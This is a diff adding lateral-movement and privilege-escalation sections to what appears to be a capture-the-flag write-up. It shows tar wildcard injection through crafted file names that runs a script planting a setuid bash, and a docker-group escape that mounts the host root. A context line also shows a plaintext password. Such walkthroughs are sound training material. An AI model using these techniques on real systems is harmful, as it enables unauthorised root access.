@@ -243,7 +243,74 @@ Password: @b_ENXkGYUCAv3zJ
 
 <figure><img src="../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>
 
+## **Lateral Movement**
 
+**Exploit:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)
+
+Jake can run a backup script as michael. The script is using a wildcard which we manipulate.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+We can trick the script to run this to get a shell by making empty files with similar names
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cd /opt/backups
+mkdir priv
+cd priv
+touch ./--checkpoint=1
+touch ./--checkpoint-action=exec=sh shell.sh
+vi shell.sh
+```
+
+**shell.sh**
+
+```
+#!/bin/bash
+
+cp /bin/bash /opt/backups/michealbash;
+chmod +xs  /opt/backups/michealbash;
+```
+
+**Victim**
+
+```
+chmod +x shell.sh 
+rm -f ../backup.tar 
+sudo -u michael /opt/backups/backup.sh 
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+## **Privilege Escalation**
+
+**Victim(micheal)**
+
+```
+id
+find / -name docker.sock 2>/dev/null
+docker images
+docker run -it -v /:/host/ alpine chroot /host/ sh
+```
+
+michael is part of the docker group so it appears we're in a pod
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+There a few images to test from. I just ran the last command above and changes the image name until it worked. Exploit worked with nginx and mysql images as well.
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 
 
